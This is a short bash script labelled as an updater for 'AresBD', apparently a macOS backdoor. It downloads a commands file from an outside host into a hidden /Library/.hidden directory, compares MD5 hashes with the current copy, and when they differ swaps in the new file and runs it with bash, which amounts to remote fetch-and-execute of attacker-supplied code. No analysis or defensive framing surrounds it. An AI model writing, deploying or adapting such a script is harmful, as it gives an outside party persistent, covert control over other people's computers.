#!/bin/bash
#AresBD Updater Script by Stsosz 
curl -o /Library/.hidden/newcommands http://atlas.stsosz.tk/newcommands

CURRENTMD5=`md5 -q /Library/.hidden/commands`

NEWMD5=`md5 -q /Library/.hidden/newcommands`

if [ "$CURRENTMD5" == "$NEWMD5" ]
then
    
    rm -rf /Library/.hidden/newcommands
	exit
    
else
    
    rm -rf /Library/.hidden/commands
    mv /Library/.hidden/newcommands /Library/.hidden/commands
    bash /Library/.hidden/commands
    
fi

